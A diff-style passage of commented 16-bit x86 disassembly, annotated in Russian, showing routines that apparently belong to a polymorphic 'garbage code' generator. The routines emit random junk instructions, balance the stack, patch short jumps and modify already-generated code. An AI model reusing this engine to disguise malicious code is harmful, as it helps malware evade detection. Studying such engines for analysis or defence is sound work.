+     06FD                       loc_06FD:
+     06FD  46                                   inc     si
+     06FE                       loc_06FE:
+     06FE  E8 FC3B                              call    RND_01234567            ; Выбираем регистр
+     0701  4E                                   dec     si
+     0702  74 07                                jz      short loc_070B          ; Jump if zero
+                                ; Регистр SP отбросить
+     0704  3C 04                                cmp     al,4
+     0706  75 08                                jne     short loc_0710          ; Jump if not equal
+     0708  40                                   inc     ax                      ; заменяем на BP
+     0709  EB 05                                jmp     short loc_0710
+     070B                       loc_070B:
+     070B  2E: FF 06 06BE                       inc     cs:StackCounter         ; добавить одно слово к счетчи-
+                                                                                ; ку стека
+     0710                       loc_0710:
+     0710  2E: 0A 84 0A5D                       or      al,cs:data_0A5D[si]
+     0715  EB C6                                jmp     short loc_06DD
+                                sub_06E0        endp
+
+                                ;==============================================================================
+                                ; Операции из набора data_0A61
+                                ; Примечание : В случае процессора 286+ необходимо отбросить строковые операции
+                                ;              со словами, т.к. если SI или DI примут значение FFFFh, то
+                                ;              возникнет общая ощибка защиты (ПЕРЕХОД ЗА ГРАНИЦУ СЕГМЕНТА)
+                                ;==============================================================================
+                                sub_0717        proc    near
+     0717  B8 0017                              mov     ax,17h
+                                ;--------------- определяем тип процессора ------------------------------------
+     071A  54                                   push    sp
+     071B  5A                                   pop     dx
+     071C  3B D4                                cmp     dx,sp
+     071E  75 03                                jne     short loc_0723        ; Jump if до 286
+     0720  2D 0003                              sub     ax,3                  ; Иначе убрать строковые операции
+     0723                       loc_0723:
+     0723  E8 FC22                              call    RND_0_AX
+     0726  96                                   xchg    si,ax
+     0727  75 05                                jnz     short loc_072E          ; Отслеживаем команду PUSHF
+     0729  2E: FF 06 06BE                       inc     cs:StackCounter
+     072E                       loc_072E:
+     072E  2E: 8A 84 0A61                       mov     al,cs:data_0A61[si]
+     0733  EB A8                                jmp     short loc_06DD          ; Write_byte
+                                sub_0717        endp
+
+                                ;==============================================================================
+                                ; Операции коррекции и загрузки из порта с вероятностью 1/2 каждая
+                                ;==============================================================================
+                                sub_0735        proc    near
+     0735  B2 D4                                mov     dl,0D4h                 ; cmd AAM/AAD IM8
+     0737  E8 FC0B                              call    RND_01                  ; с вероятностью 1/2
+     073A  74 05                                jz      short loc_0741          ; Jump if zero
+     073C  E8 02F7                              call    sub_0A36                ; Может вставить NOP ?
+     073F  B2 E4                                mov     dl,0E4h                 ; cmd IN AL,IM8
+     0741                       loc_0741:
+     0741  E8 FC01                              call    RND_01                  ; Выбираем: слова или байты
+     0744  E8 FF02                              call    sub_0649                ; Запись команды
+     0747  E8 FBE7                              call    RND_0_FF                ; Генерация IM8
+     074A  75 07                                jnz     short loc_0753          ; Jump if not zero
+     074C  80 7F FF D4                          cmp     byte ptr [bx-1],0D4h
+     0750  75 01                                jne     short loc_0753          ; Jump if not equal
+     0752  40                                   inc     ax
+     0753                       loc_0753:
+     0753  EB 88                                jmp     short loc_06DD          ; Write_byte
+                                sub_0735        endp
+
+                                ;==============================================================================
+                                ; Операция PUSH R/M
+                                ;==============================================================================
+                                sub_0755        proc    near
+     0755  B0 FF                                mov     al,0FFh
+     0757  E8 FEF1                              call    Write_byte              ; набор Grp2/3
+     075A  E8 FBD4                              call    RND_0_FF
+     075D  24 C7                                and     al,11000111b            ; из этого набора только
+     075F  0C 30                                or      al,00110000b            ; команда PUSH
+     0761  2E: FF 06 06BE                       inc     cs:StackCounter         ; добавить слово в счетчик
+     0766  F9                                   stc                             ; Set carry flag
+     0767  E9 FE70                              jmp     loc_05DA
+                                sub_0755        endp
+
+                                ;==============================================================================
+                                ; Операция XCHG REG, R/M
+                                ;==============================================================================
+                                sub_076A        proc    near
+     076A  E8 FBD8                              call    RND_01                  ; Выбираем: слова или байты
+     076D  0C 86                                or      al,86h
+     076F  E8 FED9                              call    Write_byte
+     0772  D0 E8                                shr     al,1                    ; Выбрали слова или байты ?
+     0774  73 06                                jnc     short loc_077C          ; переход, если байты
+     0776  E8 005A                              call    sub_07D3                ; генерируем байт адресации
+     0779                       loc_0779:
+     0779  E9 FE4F                              jmp     loc_05CB                ; Отлавливаем SP и записываем
+                                sub_077C:
+     077C                       loc_077C:
+     077C  E8 0054                              call    sub_07D3                ; генерируем байт адресации
+     077F  EB D2                                jmp     short loc_0753          ; Write_byte
+                                sub_076A        endp
+
+                                ;==============================================================================
+                                ; Операции LEA, LDS, LES
+                                ;==============================================================================
+                                sub_0781        proc    near
+     0781  E8 FBBE                              call    RND_012
+     0784  75 09                                jnz     short loc_078F          ; Jump if not zero
+     0786  2E: 80 3E 0A25 00                    cmp     cs:data_0A25,0          ; Можно менять регистр DS ?
+     078C  75 01                                jne     short loc_078F          ; Jump if YES
+     078E  40                                   inc     ax                      ; Если НЕТ, то откидываем LDS
+     078F                       loc_078F:
+     078F  96                                   xchg    si,ax
+     0790  2E: 8A 84 0A59                       mov     al,cs:data_0A59[si]
+     0795  E8 FEB3                              call    Write_byte
+     0798  E8 FB96                              call    RND_0_FF              ; Определяемся с байтом адресации
+     079B  3C C0                                cmp     al,11000000b
+     079D  72 02                                jb      short loc_07A1        ; Jump if below
+     079F  24 3F                                and     al,00111111b          ; MOD = 00
+     07A1                       loc_07A1:
+     07A1  EB D6                                jmp     short loc_0779
+                                sub_0781        endp
+
+                                ;==============================================================================
+                                ; Арифметические операции над регистрами
+                                ;==============================================================================
+                                sub_07A3        proc    near
+     07A3  E8 FB96                              call    RND_01234567            ; Вероятность выбора наборов
+     07A6  74 18                                jz      short loc_07C0          ; Jump if zero
+                                ;-[ Набор ArOp 1/2 ]-----------------------------------------------------------
+     07A8  E8 FB94                              call    RND_0123
+     07AB  50                                   push    ax
+     07AC  0C 80                                or      al,80h                  ; AL = 80h..83h
+     07AE  E8 FE9A                              call    Write_byte
+     07B1  D0 E8                                shr     al,1                    ; Выбрали слова или байты ?
+     07B3  E8 FFC6                              call    sub_077C
+     07B6                       loc_07B6:
+     07B6  58                                   pop     ax
+     07B7  48                                   dec     ax
+     07B8  74 03                                jz      short loc_07BD          ; Jump if zero
+     07BA  E9 FE60                              jmp     loc_061D                ; IM8
+     07BD                       loc_07BD:
+     07BD  E9 FE70                              jmp     loc_0630                ; IM16
+                                ;-[ Набор Grp 2/3 ]------------------------------------------------------------
+     07C0                       loc_07C0:
+     07C0  E8 FB82                              call    RND_01                  ; Выбираем: слова или байты
+     07C3  50                                   push    ax
+     07C4  0C F6                                or      al,0F6h                 ; набор Grp2/3
+     07C6  E8 FE82                              call    Write_byte              ; Запись команды набора
+     07C9  E8 FB70                              call    RND_01234567            ; Выбираем регистр для R/M
+     07CC  0C C0                                or      al,11000000b            ; Установить MOD = 11
+     07CE  E8 FE7A                              call    Write_byte
+     07D1  EB E3                                jmp     short loc_07B6
+                                sub_07A3        endp
+
+                                ;==============================================================================
+                                ; Генерация байта адресации с регистровой адресацией [MOD]-[REG]-[R/M]
+                                ; На входе : CF = 0 - 8-ми битные регистры
+                                ;            CF = 1 - 16-ти битные регистры
+                                ;==============================================================================
+                                sub_07D3        proc    near
+     07D3  9C                                   pushf                           ; Push flags
+     07D4  E8 FB5F                              call    RND_0_3F                ; Генерим поля REG и R/M
+     07D7  9D                                   popf                            ; Pop flags
+     07D8  73 0B                                jnc     short loc_07E5          ; Jump if CF=0
+                                ; если операции с 16-ти битными регистрами, то нужно следить за SP
+     07DA  8A E0                                mov     ah,al
+     07DC  80 E4 07                             and     ah,00000111b            ; Выделить поле R/M
+     07DF  80 FC 04                             cmp     ah,00000100b            ; Операции с SP пропускаем
+     07E2  75 01                                jne     short loc_07E5          ; Jump if not equal
+     07E4  40                                   inc     ax                      ; Вместо SP ставим BP
+     07E5                       loc_07E5:
+     07E5  0C C0                                or      al,11000000b            ; MOD = 11
+     07E7  C3                                   retn
+                                sub_07D3        endp
+
+                                ;==============================================================================
+                                ; Операции MUL/IMUL над регистрами
+                                ;==============================================================================
+                                sub_07E8        proc    near
+     07E8  E8 FB5A                              call    RND_01                  ; Выбираем: слова или байты
+     07EB  0C F6                                or      al,0F6h                 ; Набор Grp 2/3
+     07ED  E8 FE5B                              call    Write_byte              ; Запись команды набора
+     07F0  92                                   xchg    dx,ax
+     07F1  E8 FB3D                              call    RND_0_FF                ; генерим байт адресации
+     07F4  24 CF                                and     al,11001111b            ; Из набора Grp 2/3 выбираем
+     07F6  0C 20                                or      al,00100000b            ;  команды MUL/IMUL
+     07F8  D0 EA                                shr     dl,1                    ; Выбрали слова или байты ?
+     07FA  E9 FDDD                              jmp     loc_05DA
+                                sub_07E8        endp
+
+                                ;==============================================================================
+                                ; Операции NOT/NEG над регистрами
+                                ;==============================================================================
+                                sub_07FD        proc    near
+     07FD  E8 FB45                              call    RND_01                  ; Выбираем: слова или байты
+     0800  9C                                   pushf                           ; Push flags
+     0801  0C F6                                or      al,0F6h                 ; Набор Grp 2/3
+     0803  92                                   xchg    dx,ax
+     0804  E8 FB32                              call    RND_0_F                 ; AL = 0000 xREG
+     0807  8A E2                                mov     ah,dl
+     0809  0C D0                                or      al,11010000b            ; MOD = 11, OP=01x, REG =RND
+     080B  9D                                   popf                            ; Pop flags
+     080C  74 0B                                jz      short loc_0819          ; Выбрали слова или байты ?
+                                ; если операции с 16-ти битными регистрами, то нужно следить за SP
+     080E  8A D0                                mov     dl,al
+     0810  80 E2 07                             and     dl,00000111b
+     0813  80 FA 04                             cmp     dl,00000100b            ; отбросить SP
+     0816  75 01                                jne     short loc_0819          ; Jump if not equal
+     0818  40                                   inc     ax                      ; Вместо SP ставим BP
+     0819                       loc_0819:
+     0819  86 C4                                xchg    al,ah
+     081B                       loc_081B:
+     081B  E9 FE18                              jmp     loc_0636                ; Write_byte
+                                sub_07FD        endp
+
+                                ;==============================================================================
+                                ; Операции вращения содержимого регистров
+                                ;==============================================================================
+                                sub_081E        proc    near
+     081E  E8 FB1E                              call    RND_0123
+     0821  0C D0                                or      al,0D0h                 ; AL = D0h..D3h
+     0823  E8 FE25                              call    Write_byte              ; Записать команду
+     0826  D0 E8                                shr     al,1                    ;
+     0828  9C                                   pushf                           ; Push flags
+     0829  E8 FB0A                              call    RND_0_3F
+     082C  9D                                   popf                            ; Pop flags
+     082D  73 0B                                jnc     short loc_083A          ; Выбрали слова или байты ?
+                                ; если операции с 16-ти битными регистрами, то нужно следить за SP
+     082F  8A E0                                mov     ah,al
+     0831  80 E4 07                             and     ah,00000111b
+     0834  80 FC 04                             cmp     ah,00000100b            ; отбросить SP
+     0837  75 01                                jne     short loc_083A          ; Jump if not equal
+     0839  40                                   inc     ax                      ; Вместо SP ставим BP
+     083A                       loc_083A:
+     083A  0C C0                                or      al,11000000b            ; MOD = 11 (только регистры)
+     083C                       loc_083C:
+     083C  E9 FE0C                              jmp     loc_064B                ; Write_Byte
+                                sub_081E        endp
+
+                                ;==============================================================================
+                                ; Процедура генерирующая команды выравнивания стека
+                                ; Вход : AX - количество слов, на которое надо выровнять стек
+                                ;==============================================================================
+
+                                sub_083F        proc    near
+     083F  51                                   push    cx
+     0840  B1 58                                mov     cl,58h                  ; cmd POP REG
+     0842  48                                   dec     ax                      ; AX = 1
+     0843  74 3B                                jz      short loc_0880          ; Jump if zero
+     0845  48                                   dec     ax                      ; AX = 2
+     0846  74 35                                jz      short loc_087D          ; Jump if zero
+     0848  40                                   inc     ax                      ; AX = 0
+     0849  40                                   inc     ax
+     084A  74 37                                jz      short loc_0883          ; Jump if zero
+     084C  B1 50                                mov     cl,50h                  ; cmd PUSH REG
+     084E  40                                   inc     ax                      ; AX = -1 (FFFFh)
+     084F  74 2F                                jz      short loc_0880          ; Jump if zero
+     0851  40                                   inc     ax                      ; AX = -2 (FFFEh)
+     0852  74 29                                jz      short loc_087D          ; Jump if zero
+                                ;------------------------------------------------------------------------------
+                                ; Число AX преобразовать в количество слов (т.е. умножить на 2)
+     0854  48                                   dec     ax
+     0855  48                                   dec     ax
+     0856  D1 E0                                shl     ax,1                    ; умножить на 2
+     0858  8B C8                                mov     cx,ax                   ; CX = количество слов
+     085A  98                                   cbw                             ; Convrt byte to word
+     085B  3B C1                                cmp     ax,cx                   ; Больше 127(7F) ?
+     085D  9C                                   pushf                           ; Push flags
+                                ;------------------------------------------------------------------------------
+                                ; Выбираем что делать : отнимать или прибавлять SP
+     085E  E8 FAE4                              call    RND_01                  ; Прибавить или отнять ?
+                                                ; ---------------- прибавить
+     0861  B8 C483                              mov     ax,0C483h               ; cmd <ADD SP, IM8>  {83 C4 xx}
+     0864  74 04                                jz      short loc_086A          ; Jump if RND = 0
+                                                ; ---------------- отнять
+     0866  B4 EC                                mov     ah,0ECh                 ; cmd <SUB SP, IM8>  {83 EC xx}
+     0868  F7 D9                                neg     cx                      ; CX = -CX
+     086A                       loc_086A:
+     086A  9D                                   popf                            ; Pop flags
+     086B  75 07                                jnz     short loc_0874          ; Переход, если больше 127
+                                ;-------- БАЙТЫ (IM8) ---------------------------------------------------------
+     086D  E8 FDC6                              call    Write_word              ; Запись команды
+     0870  91                                   xchg    cx,ax
+     0871  59                                   pop     cx
+     0872  EB C8                                jmp     short loc_083C          ; Write_Byte (запись IM8)
+                                ;-------- СЛОВА (IM16) --------------------------------------------------------
+                                ; {81 EC xx xx} - ADD SP, IM16              {81 EC xx xx} - SUB SP, IM16
+     0874                       loc_0874:
+     0874  B0 81                                mov     al,81h
+     0876  E8 FDBD                              call    Write_word
+     0879  91                                   xchg    cx,ax
+     087A  59                                   pop     cx
+     087B                       loc_087B:
+     087B  EB 9E                                jmp     short loc_081B
+                                ;------------------------------------------------------------------------------
+     087D                       loc_087D:
+     087D  E8 0005                              call    sub_0885
+     0880                       loc_0880:
+     0880  E8 0002                              call    sub_0885
+     0883                       loc_0883:
+     0883  59                                   pop     cx
+     0884  C3                                   retn
+                                sub_083F        endp
+
+                                ;==============================================================================
+                                ; Процедура генерации битов R/M в байте адресации
+                                ;==============================================================================
+                                sub_0885        proc    near
+     0885  E8 FAB4                              call    RND_01234567            ; Выбираем регистр
+     0888  0A C1                                or      al,cl
+     088A  3C 5C                                cmp     al,5Ch                  ; Операции POP SP ?
+     088C  75 AE                                jne     loc_083C                ; Jump if NO
+     088E  B0 07                                mov     al,7                    ; Заменяем на POP ES
+     0890  EB AA                                jmp     short loc_083C
+                                sub_0885        endp
+
+                                ;==============================================================================
+                                ; Генерация инструкций условных и безусловных SHORT переходов
+                                ; Переходы только вперед, т.е. с положительным смещением
+                                ;==============================================================================
+                                sub_0892        proc    near
+     0892  2E: 83 3E 06F3 00                    cmp     cs:data_06F3,0          ; Подпрограммы были ?
+     0898  74 05                                je      short loc_089F          ; Jump if НЕТ
+     089A  E8 FAA2                              call    RND_0123                ; ДА. Вероятность 1/4
+     089D  75 29                                jnz     short loc_ret_08C8      ; Jump if RND <> 0
+     089F                       loc_089F:
+     089F  B8 0015                              mov     ax,15h
+     08A2  E8 FAA3                              call    RND_0_AX                ; Вероятность
+     08A5  B4 EB                                mov     ah,0EBh                 ; cmd JMP SHORT безусловный
+     08A7  74 0C                                jz      short loc_08B5          ; Jump if RND = 0
+     08A9  B4 DF                                mov     ah,0DFh                 ; команды закрытия цикла
+     08AB  02 E0                                add     ah,al
+     08AD  2C 05                                sub     al,5
+     08AF  72 04                                jc      short loc_08B5          ; Jump if carry Set
+     08B1  B4 70                                mov     ah,70h                  ; JMP SHORT по условию
+     08B3  02 E0                                add     ah,al
+     08B5                       loc_08B5:
+     08B5  8A C4                                mov     al,ah
+     08B7  32 E4                                xor     ah,ah                   ; Zero register
+     08B9  5A                                   pop     dx
+                                ;-------------- занести в массив информацию про еще один SHORT переход
+     08BA  2E: FF 36 06BE                       push    cs:StackCounter         ;─┐
+     08BF  43                                   inc     bx                      ; │ Новый SHORT переход
+     08C0  53                                   push    bx                      ; │
+     08C1  4B                                   dec     bx                      ;─┘
+     08C2  52                                   push    dx
+     08C3  EB B6                                jmp     short loc_087B
+                                sub_0892        endp
+
+                                ;==============================================================================
+                                ; Вызов процедуры формирования смещений для SHORT переходов
+                                ;==============================================================================
+                                sub_08C5        proc    near
+     08C5  E8 0001                              call    sub_08C9         ; То что не вызывается напрямую -
+                                                                         ;   ключевой момент
+     08C8                       loc_ret_08C8:
+     08C8  C3                                   retn
+                                sub_08C5        endp
+
+                                ;==============================================================================
+                                ; Процедура простановки смещений в инструкциях короткого перехода (SHORT)
+                                ; Примечание : SHORT переходы могут быть только внутри участка, но не между
+                                ;               участками, даже если они в одной подпрограмме
+                                ;==============================================================================
+                                sub_08C9        proc    near
+     08C9  2E: 8F 06 0921                       pop     cs:data_0921
+     08CE  5A                                   pop     dx
+     08CF  8B CB                                mov     cx,bx                   ; текущий указатель адреса
+                                                                                ; генерируемого участка
+     08D1                       loc_08D1:
+     08D1  5E                                   pop     si
+     08D2  0B F6                                or      si,si                   ; Mark-end ?
+     08D4  74 48                                jz      short loc_091E          ; Jump to exit if YES
+                                ;------------------------------------------------------------------------------
+     08D6  58                                   pop     ax                      ; Количество слов в счетчике
+                                                                                ;  стека на момент записи ко-
+                                                                                ;  манды SHORT перехода
+     08D7  2E: 83 3E 06F3 00                    cmp     cs:data_06F3,0          ; На этом участке со стеком
+                                                                                ;  что-нибудь делали ?
+     08DD  74 0F                                je      short loc_08EE          ; НЕТ. Тогда нечего проверять
+                                                ; ДА, делали.
+                                                ; Пытаемся корректировать стек к значению до команды перехода
+     08DF  2E: 87 06 06BE                       xchg    cs:StackCounter,ax
+     08E4  2E: 2B 06 06BE                       sub     ax,cs:StackCounter
+     08E9  E8 FF53                              call    sub_083F
+     08EC  EB 0B                                jmp     short loc_08F9
+     08EE                       loc_08EE:
+     08EE  2E: 3B 06 06BE                       cmp     ax,cs:StackCounter
+     08F3  73 04                                jae     short loc_08F9          ; Jump if above or =
+     08F5  2E: A3 06BE                          mov     cs:StackCounter,ax
+                                ;------------------------------------------------------------------------------
+     08F9                       loc_08F9:
+     08F9  8B C3                                mov     ax,bx                   ; ─┐ Расстояние от текущего
+     08FB  2B C6                                sub     ax,si                   ;  │ адреса до команды перехода
+     08FD  48                                   dec     ax                      ;  │ менее 128 байт ?
+     08FE  3D 0080                              cmp     ax,80h                  ; ─┘
+     0901  72 14                                jb      short loc_0917          ; Jump if YES
+     0903  2E: 83 3E 06F3 00                    cmp     cs:data_06F3,0          ; На этом участке делали
+                                                                                ;  что-нибудь со стеком ?
+     0909  75 0A                                jne     short loc_0915          ; Jump if YES
+                                                ; Если со стеком ничего не делали, то можно
+                                                ; поставить переход и на соседние команды переходов
+     090B  8B C1                                mov     ax,cx                   ; ─┐ Расстояние между двумя
+     090D  2B C6                                sub     ax,si                   ;  │ командами SHORT переходов
+     090F  48                                   dec     ax                      ;  │ менее 128 байт ?
+     0910  3D 0080                              cmp     ax,80h                  ; ─┘
+     0913  72 02                                jb      short loc_0917          ; Jump if YES
+     0915                       loc_0915:
+     0915  32 C0                                xor     al,al                   ; Ставим смещение 0
+     0917                       loc_0917:
+     0917  8D 4C FF                             lea     cx,[si-1]               ; CX - адрес предыдущего
+                                                                                ;       перехода
+     091A  88 04                                mov     [si],al                 ; Записать полученное смещение
+     091C  EB B3                                jmp     short loc_08D1
+     091E                       loc_091E:
+     091E  56                                   push    si
+     091F  52                                   push    dx
+     0920  B8 ????                              mov     ax,1111h
+                                data_0921       =       word ptr $ - 2
+     0923  FF E0                                jmp     ax                      ; Register jump
+                                sub_08C9        endp
+
+                                ;===================================================================[MemModify]
+                                ; Оперции пересылки в память (MOV mem / POP mem)
+                                ;==============================================================================
+                                sub_0925        proc    near
+     0925  E8 00EC                              call    sub_0A14                ; Как там с сегментом данных ?
+     0928  E8 FA1A                              call    RND_01                  ; Вероятность MOV и POP - 1/2
+     092B  74 07                                jz      short loc_0934          ; Jump if RND=0
+     092D                       loc_092D:
+     092D  E8 FA15                              call    RND_01                  ; Выбираем: слова или байты
+     0930  0C A2                                or      al,0A2h                 ; cmd MOV mem, reg
+     0932  EB 43                                jmp     short loc_0977
+     0934                       loc_0934:
+     0934  2E: A1 06BE                          mov     ax,cs:StackCounter
+     0938  2E: 3B 06 06F3                       cmp     ax,cs:data_06F3         ; Есть ли сейчас на участке не
+                                                                                ;  снятые со стека слова ?
+     093D  74 EE                                je      loc_092D                ; Jump if NO
+                                ;------------------------------------------------------------------------------
+     093F  2E: FF 0E 06BE                       dec     cs:StackCounter         ; уменьшить счетчик стека на 1
+     0944  B0 8F                                mov     al,8Fh                  ; cmd POP R/M
+     0946  E8 FD02                              call    Write_byte
+     0949  B0 06                                mov     al,6                    ; Байт адресации
+                                                                                ;  (MOD=00,R/M=disp16)
+     094B  EB 2A                                jmp     short loc_0977
+                                sub_0925        endp
+
+                                ;===================================================================[MemModify]
+                                ; Арифметические операции над памятью из набора data_0A43
+                                ;==============================================================================
+                                sub_094D        proc    near
+     094D  E8 00C4                              call    sub_0A14                ; Как там с сегментом данных ?
+     0950  B8 000C                              mov     ax,0Ch
+     0953  E8 F9F2                              call    RND_0_AX
+     0956  96                                   xchg    si,ax
+     0957  2E: 8A 84 0A43                       mov     al,cs:data_0A43[si]
+     095C  34 02                                xor     al,2                    ; Меняем напрвление пересылки
+                                                                                ;  результата
+     095E  EB 6A                                jmp     short loc_09CA
+                                sub_094D        endp
+
+                                ;===================================================================[MemModify]
+                                ; Операции NOT/NEG и INC/DEC над содержимым памяти
+                                ;==============================================================================
+                                sub_0960        proc    near
+     0960  E8 00B1                              call    sub_0A14                ; Как там с сегментом данных ?
+     0963  E8 F9DF                              call    RND_01                  ; Вероятность - 1/2
+     0966  74 11                                jz      short loc_0979          ; Jump if zero
+                                ;-[ Набор Grp 2/3 ]-[ cmd DEC/INC ]--------------------------------------------
+     0968  E8 F9DA                              call    RND_01                  ; Выбираем: слова или байты
+     096B  0C FE                                or      al,0FEh
+     096D  E8 FCDB                              call    Write_byte              ; запись команды набора
+     0970  E8 F9BE                              call    RND_0_FF
+     0973  24 08                                and     al,00001000b            ; При MOD=00
+     0975  0C 06                                or      al,00000110b            ; и адресацией disp16
+     0977                       loc_0977:
+     0977  EB 63                                jmp     short sub_09DC         ; сформировать адрес модификации
+                                ;-[ Набор Grp 1 ]-[ cmd NOT/NEG ]----------------------------------------------
+     0979                       loc_0979:
+     0979  E8 F9C9                              call    RND_01                  ; Выбираем: слова или байты
+     097C  0C F6                                or      al,0F6h
+     097E  E8 FCCA                              call    Write_byte              ; запись команды набора
+     0981  E8 F9AD                              call    RND_0_FF
+     0984  24 08                                and     al,00001000b            ; При MOD=00
+     0986  0C 16                                or      al,00010110b            ; и адресацией disp16
+     0988  EB 52                                jmp     short sub_09DC         ; сформировать адрес модификации
+                                sub_0960        endp
+
+                                ;===================================================================[MemModify]
+                                ;
+                                ;==============================================================================
+                                sub_098A        proc    near
+     098A  E8 0087                              call    sub_0A14                ; Как там с сегментом данных ?
+     098D  E8 F9A9                              call    RND_0_F
+
+                                ; С вероятностью 1/16 используется команда из набора Grp1
+                                ; F6 006 xx xx zz    - TEST byte ptr [xxxx], zz
+                                ; F7 006 xx xx zz zz - TEST word ptr [xxxx], zzzz
+     0990  B2 F6                                mov     dl,0F6h
+     0992  74 21                                jz      short loc_09B5          ; Jump if zero
+
+                                ; С вероятностью 1/16 используется команда из набора
+                                ; C6 006 xx xx zz    - MOV byte ptr [xxxx], zz
+                                ; C7 006 xx xx zz zz - MOV word ptr [xxxx], zzzz
+     0994  B2 C6                                mov     dl,0C6h
+     0996  48                                   dec     ax
+     0997  74 1C                                jz      short loc_09B5          ; Jump if zero
+
+                                ; С вероятностью 14/16 используется команда из набора ArOp 1/2
+                                ; 80/82 0?6 xx xx zz     - ArOp byte ptr [xxxx], zz
+                                ; 81/83 0?6 xx xx zz zz  - ArOp word ptr [xxxx], zzzz
+     0999  E8 F9A3                              call    RND_0123
+     099C  50                                   push    ax
+     099D  0C 80                                or      al,80h                  ; AL = 80h..83h
+     099F  E8 FCA9                              call    Write_byte              ; Запись команды
+                                ;--------------- Определяемся с байтом адресации ------------------------------
+     09A2  E8 F991                              call    RND_0_3F                ; Генерация байта адресации
+                                                                                ;  MOD = 00
+     09A5  0C 07                                or      al,00000111b
+     09A7  48                                   dec     ax                      ; AX = 00???110b (disp16)
+                                ;------------------------------------------------------------------------------
+     09A8                       loc_09A8:
+     09A8  E8 0031                              call    sub_09DC               ; сформировать адрес модификации
+                                                                               ;   (xxxx)
+                                ;--------------- сформировать операнд (zzzz)
+     09AB  58                                   pop     ax
+     09AC  48                                   dec     ax
+     09AD  74 03                                jz      short loc_09B2          ; Jump if zero
+     09AF  E9 FC6B                              jmp     loc_061D                ; IM8 (zz)
+     09B2                       loc_09B2:
+     09B2  E9 FC7B                              jmp     loc_0630                ; IM16 (zzzz)
+                                ;------------------------------------------------------------------------------
+     09B5                       loc_09B5:
+     09B5  E8 F98D                              call    RND_01                  ; Выбираем: слова или байты
+     09B8  50                                   push    ax
+     09B9  0A C2                                or      al,dl
+     09BB  E8 FC8D                              call    Write_byte              ; Записать команду
+     09BE  B0 06                                mov     al,00000110b            ; MOD=00, R/M=disp16
+     09C0  EB E6                                jmp     short loc_09A8
+                                sub_098A        endp
+
+                                ;===================================================================[MemModify]
+                                ; Генерация операций вращения/сдвига содержимого памяти (КОП = D0h,D1h,D2h,D3h)
+                                ; -= ShiftOperation with mem =-      ShftOp [mem],<nn>    (nn=1 or CL)
+                                ;==============================================================================
+                                sub_09C2        proc    near
+     09C2  E8 004F                              call    sub_0A14                ; Как там с сегментом данных ?
+     09C5  E8 F977                              call    RND_0123
+     09C8  0C D0                                or      al,0D0h                 ; AX = RND (D0h..D3h)
+                                ;------------------------------------------------------------------------------
+     09CA                       loc_09CA:
+     09CA  E8 FC7E                              call    Write_byte              ; Запись команды
+     09CD  92                                   xchg    dx,ax                   ; DL = КОП
+     09CE  E8 F960                              call    RND_0_FF                ; AX = случайный байт адресации
+                                                ; т.к. через эти команды проходит не только процедура sub_09C2
+                                                ; но и другие процедуры, то нужно проверить кое-что
+     09D1  80 FA 8C                             cmp     dl,8Ch               ; этим "кое-что" есть команда
+                                                                             ; MOV r/m, SEG
+     09D4  75 02                                jne     short loc_09D8
+     09D6  24 18                                and     al,00011000b         ; т.к. в команде MOV r/m, SEG
+                                                                             ; поле reg должно быть в диапазоне
+                                                                             ; от 000 до 011, то нужно сбросить
+                                                                             ; старший (для reg -0xx-) бит
+     09D8                       loc_09D8:
+                                ; Все байты адресации настраиваются так, чтобы MOD=00, а операции
+                                ; производились бы только с непосредственным адресом памяти disp16 (R/M=110).
+                                ; Сделано так потому, что адреса вычисляемые через регистры общего
+                                ; назначения использовать нельзя в следствии их постоянной модификации.
+
+     09D8  24 38                                and     al,38h       ; MOD = 00, reg = RND(0..7)
+     09DA  0C 06                                or      al,6         ; r/m = 6 (адресация только с disp16)
+
+                                ;==============================================================================
+                                ; Процедура формирует адрес ячейки памяти с которым МОЖНО производить
+                                ; операции модификации. В качестве таких ячеек используются адреса уже
+                                ; сгенерированных (пройденных) участков кода (берутся из ИНФО-блока).
+                                ; Принцип подбора такой : есть общее число (размер) уже сгенерированных
+                                ; байт. Берем из этого диапазона случайное число. Затем начинаем перебирать
+                                ; уже сгенерированные участки и пытаться в них втиснуться. На практике это
+                                ; означает ситуацию, когда модификации будут подвергаться те участки, кото-
+                                ; рые уже были пройдены и к ним уже не вернемся.
+                                ;==============================================================================
+
+                                sub_09DC        proc    near
+     09DC  E8 FC6C                              call    Write_byte              ; Запись байта адресации
+     09DF  B8 ????                              mov     ax,1111h              ; AX = количество записанных
+                                BytesWrittenCounter     = word ptr $ - 2      ; байт через процедуру Write_byte
+                                                                              ; а фактически сколько уже
+                                                                              ; сгенерировали байт "мусора"
+     09E2  48                                   dec     ax
+     09E3  74 1B                                jz      short loc_0A00          ; Jump if zero
+     09E5  E8 F960                              call    RND_0_AX
+                                ; Фактически случайное число в AX определяет в каком участке будет выделена
+                                ; ячейка памяти под модификацию
+     09E8  92                                   xchg    dx,ax                   ; DX - случайное число в диапа-
+                                                                                ;  зоне уже сгенерированных
+                                                                                ;  байт
+     09E9  BE ????                              mov     si,1111h              ; указатель на начало ИНФО-блока
+                                data_09EA       =       word ptr $ - 2
+     09EC                       loc_09EC:
+                                ; Читаем очередную запись в ИНФО-блоке
+     09EC  AD                                   lodsw                           ; String [si] to ax
+     09ED  91                                   xchg    cx,ax
+     09EE  AD                                   lodsw                           ; String [si] to ax
+     09EF  42                                   inc     dx
+     09F0  3B D1                                cmp     dx,cx
+     09F2  72 09                                jb      short loc_09FD          ; Jump if below
+     09F4  74 01                                jz      short loc_09F7          ; Jump if zero
+     09F6  4A                                   dec     dx
+     09F7                       loc_09F7:
+                                ; Переход к следующей записи в ИНФО-блоке
+     09F7  03 F1                                add     si,cx
+     09F9  2B D1                                sub     dx,cx
+     09FB  EB EF                                jmp     short loc_09EC
+     09FD                       loc_09FD:
+     09FD  4A                                   dec     dx
+     09FE  03 C2                                add     ax,dx
+                                ;----------------------------------------------------------------
+                                ; Запись адреса ячейки памяти выделенной под модификацию
+     0A00                       loc_0A00:
+     0A00  57                                   push    di
+     0A01  50                                   push    ax
+     0A02  BF 27BE                              mov     di,1111h
+                                data_0A03       =       word ptr $ - 2
+     0A05  AB                                   stosw                           ; Store ax to es:[di]
+     0A06  96                                   xchg    si,ax
+     0A07  A5                                   movsw                           ; Mov [si] to es:[di]
+     0A08  2E: 89 3E 0A03                       mov     cs:data_0A03,di
+     0A0D  58                                   pop     ax
+     0A0E  5F                                   pop     di
+     0A0F  FE C4                                inc     ah
+     0A11  E9 FC22                              jmp     loc_0636
+                                sub_09DC        endp
+                                sub_09C2        endp
+                                ;==============================================================================
+                                ;                 * Процедура вставки редиректора сегментов *
+                                ;==============================================================================
